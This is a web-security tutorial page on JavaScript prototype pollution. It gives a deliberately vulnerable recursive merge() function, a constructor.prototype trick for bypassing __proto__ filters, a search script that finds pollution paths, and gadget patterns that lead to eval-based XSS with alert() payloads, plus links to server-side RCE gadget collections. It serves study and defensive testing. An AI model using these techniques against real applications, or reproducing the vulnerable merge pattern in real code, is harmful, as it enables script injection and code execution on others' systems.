---
description: >-
  Exploit recursive property setting functions with special .__proto__ and
  .prototype options to add fallbacks to other property accesses
---

# Prototype Pollution

## Description

JavaScript has a feature called ["Object prototypes"](https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Objects/Object\_prototypes) that allows you to add **default fallback properties** to objects as a fallback if they don't exist yet. Every type has a separate prototype, but instances of the same type will share that prototype.

<pre class="language-javascript"><code class="lang-javascript">const obj = {};
<strong>obj.__proto__.name = "John";
</strong>console.log(obj.name); // John (this object will now get a .name property)

const newObj = {};
console.log(newObj.name); // John (prototype was used as fallback)

const newFilledObj = { name: "Jane" };
console.log(newFilledObj.name); // Jane (won't replace existing properties)
</code></pre>

Check out the following article for a more detailed explanation of prototypes and pollution:

{% embed url="https://portswigger.net/web-security/prototype-pollution" %}
Detailed explanation of the theory behind prototype pollution
{% endembed %}

Where polluting comes in is when an application allows you to **set arbitrary properties on an object**. This allows you as the attacker to set the `__proto__` property and alter other objects because you control fallback values. Common sources of pollution come from recursive property setting functions like `merge()`, or parsing some attacker-controlled string into an object by using recursion.

<pre class="language-javascript" data-title="Vulnerable Example"><code class="lang-javascript"><strong>function merge(target, source) {
</strong><strong>  for (const attr in source) {
</strong><strong>    if (typeof target[attr] === "object" &#x26;&#x26; typeof source[attr] === "object") {
</strong><strong>      merge(target[attr], source[attr]);
</strong><strong>    } else {
</strong><strong>      target[attr] = source[attr];
</strong><strong>    }
</strong><strong>  }
</strong><strong>  return target;
</strong><strong>}
</strong>
const obj = {
  a: 1,
};
const input = JSON.parse('{"__proto__": {"b": 2}}');
merge(obj, input);
console.log(obj.b); // 2

const newObj = {};
console.log(newObj.b); // 2 (polluted)
</code></pre>

To better understand why this is vulnerable you should follow it with a debugger by setting a breakpoint at the merge function. The function will first take the first attribute from the `source` which is `__proto__`, and then because its value is an object, enter the recursion by calling itself with both values. This again looks at the attributes and finds b which isn't an object on target and source, so it sets the attribute directly on the target. At this step, we took `target["__proto__"]`, and then set `["b"] = 2` on it. This effectively does the same as in the previous example and will pollute the whole `Object` prototype as shown by the `newObj`.

In some other cases, you will find that this function isn't recursively setting properties, but instead sets the final property to a whole value at once. An example of this was a vulnerability in [xml2js < 0.5.0](https://security.snyk.io/vuln/SNYK-JS-XML2JS-5414874), where XML was parsed into an Object. This situation is not vulnerable to prototype pollution as it mimics the following example:

```javascript
let a = {};
a.__proto__.a = 1;
console.log({}.a) // 1

let b = {};
b.__proto__ = { b: 2 };
console.log({}.b) // undefined (not polluted)
```

For more complex types that aren't directly `Object`s, their prototype may be different from the target variable that you want to pollute. Take an HTML element, for example. This is a complex type with a lot of nested inheritance, but by chaining enough properties we can reaccess the Object prototype as everything in JavaScript inherits from it:

```javascript
const root = document.createElement("div");

root.__proto__; // HTMLDivElement
root.__proto__.__proto__; // HTMLElement
root.__proto__.__proto__.__proto__; // Element
root.__proto__.__proto__.__proto__.__proto__; // Node
root.__proto__.__proto__.__proto__.__proto__.__proto__; // EventTarget
root.__proto__.__proto__.__proto__.__proto__.__proto__.__proto__; // Object

root.__proto__.__proto__.__proto__.__proto__.__proto__.__proto__.a = 1;
console.log({}.a); // 1 (polluted)
```

## Bypassing filters using `constructor.prototype`

Because this vulnerability is relatively well-known, some developers correctly block the `__proto__` key from being set. This prevents the attack shown above, but there is another important keyword `.prototype` that **all constructors** have. We can easily access an instance's constructor by accessing its `.constructor` property.

```javascript
let obj = {};
obj.constructor.prototype.a = 1;

let newObj = {};
console.log(newObj.a); // 1
```

This is useful as it semi-replaces the need for `__proto__` in most cases, but one caveat is that we cannot simply chain them on top of each other because we will reach a loop of getting the same constructor every time, thus never reaching Object. Luckily, some other properties have different types, some of which may be `Object`s themselves. Accessing such an instance's `.constructor.prototype` brings us back to the Object prototype with which we can pollute anything.

{% embed url="https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/#step3-prototype-pollution-again" %}
Related writeup explaining this problem
{% endembed %}

<details>

<summary>Breadth-First Search (BFS) algorithm for property access to other types</summary>

The following script implements a Breadth-First Search algorithm to search all properties for new constructors that may be `Object`. It prints all the paths to the results and won't search duplicates. Use it by changing the `root` variable to the variable that you can set arbitrary properties on, then choose to target Object or any other type that you want to pollute. `Object` is a likely target because every other type inherits from it.

```javascript
// Get all accessible properties of an object
function props(obj) {
  // Source: https://stackoverflow.com/a/30158566/10508498
  var p = [];
  for (; obj != null; obj = Object.getPrototypeOf(obj)) {
    var op = Object.getOwnPropertyNames(obj);
    for (var i = 0; i < op.length; i++) {
      if (p.indexOf(op[i]) == -1) {
        p.push(op[i]);
      }
    }
  }
  return p;
}

// Breadth-First Search (BFS)
function search(root, target) {
  const checked = new Set();
  const queue = [[root, []]];

  while (queue.length > 0) {
    const [node, path] = queue.shift();
    // Don't check the same node twice
    if (checked.has(node)) {
      continue;
    }
    checked.add(node);

    // We found the target
    if (node.constructor === target) {
      // return path;
      console.log(path_string(path));
      continue;
    }

    for (const key of props(node)) {
      // Not allowed in strict mode
      if (key === "caller" || key === "callee" || key === "arguments" || key === "__proto__" || key === "prototype" || key === "constructor") {
        continue;
      }
      // Add childs to queue if they are not empty
      const child = node[key];
      if (child !== null && child !== undefined) {
        queue.push([child, [...path, key]]);
      }
    }
  }
}

// Convert path to property access string
function path_string(path) {
  return (
    path.reduce((acc, key) => {
      if (acc === "") {
        return key;
      }
      return acc + `["${key}"]`;
    }, "root") + '["constructor"]["prototype"]'
  );
}

const root = document.createElement("div");
console.log("Starting search...");
search(root, Object);
console.log("Done!");
```

</details>

The above creates an `HTMLDivElement` as an example starting point and finds paths all the way to a raw `Object`:

{% code title="Search results" %}
```javascript
root["ownerDocument"]["defaultView"]["JSON"]["constructor"]["prototype"]
root["ownerDocument"]["defaultView"]["Math"]["constructor"]["prototype"]
root["ownerDocument"]["defaultView"]["Intl"]["constructor"]["prototype"]
root["ownerDocument"]["defaultView"]["Atomics"]["constructor"]["prototype"]
root["ownerDocument"]["defaultView"]["Reflect"]["constructor"]["prototype"]
root["ownerDocument"]["defaultView"]["WebAssembly"]["constructor"]["prototype"]
root["ownerDocument"]["defaultView"]["CSS"]["constructor"]["prototype"]
root["ownerDocument"]["defaultView"]["console"]["constructor"]["prototype"]
```
{% endcode %}

That means you are able to pollute the `Object` prototype by setting the following properties:

<pre class="language-javascript"><code class="lang-javascript"><strong>const root = document.createElement("div");
</strong><strong>root["ownerDocument"]["defaultView"]["JSON"]["constructor"]["prototype"].a = 1
</strong>
console.log({}.a) // 1
</code></pre>

## Sinks (Gadgets)

When you find a way to pollute the prototype and have confirmed that any new instance of that type has the fallback property you set, it is time to find a way to exploit it. There are some common patterns that will unknowingly use prototype properties if their regular properties aren't set. These can then be overwritten and cause all kinds of extra behaviour inside the code. You may find a way to add a sensitive property that should normally not contain user input.

Here are a few examples of patterns to look for. What these all have in common is that properties are accessed, and prototypes will also be looked at:

<pre class="language-javascript"><code class="lang-javascript">// 1. "code" property is conditionally accessed, and prototype may be used if not set
<strong>({}).__proto__.code = "alert(1)";
</strong>
let settings = {};
if (settings.code) {
  eval(settings.code);
}

// 2. Keys in Object are iterated over, and prototype adds more attributes
<strong>({}).__proto__.onerror = "alert(2)";
</strong>
let attributes = { id: "unique", src: "..." };
let img = document.createElement("img");
for (const key in attributes) {
  // id, src, onload
  img.setAttribute(key, attributes[key]);
}

// 3. Polluting the Array prototype to add another index
<strong>[].__proto__["1"] = "alert(3)";
</strong>
let split = "key".split(":");
if (split[1]) {
  eval(split[1]);
}
</code></pre>

The above is useful when a custom gadget needs to be found, but common libraries have already been researched to find common gadgets collected in the following repository:

{% embed url="https://github.com/BlackFan/client-side-prototype-pollution" %}
Collection of **client-side** prototype pollution gadgets in well-known libraries
{% endembed %}

## Server-Side Prototype Pollution

Ordinarily, JavaScript runs in the Browser and the impact is often XSS. But engines like NodeJS which also support prototypes in the same way are also vulnerable to the same types of attacks. Gadgets will now be targetting the server side of the application, often resulting in Remote Code Execution by adding the right properties.

Read more about detecting such vulnerabilities in the following article:

{% embed url="https://portswigger.net/research/server-side-prototype-pollution" %}
Explaining research in **detection** of server-side prototype pollution in various **frameworks**
{% endembed %}

Next, you can find many libraries that also have known server-side gadgets allowing for high-impact bugs:

{% embed url="https://github.com/KTH-LangSec/server-side-prototype-pollution" %}
Collection of **server-side** prototype pollution gadgets in well-known libraries
{% endembed %}
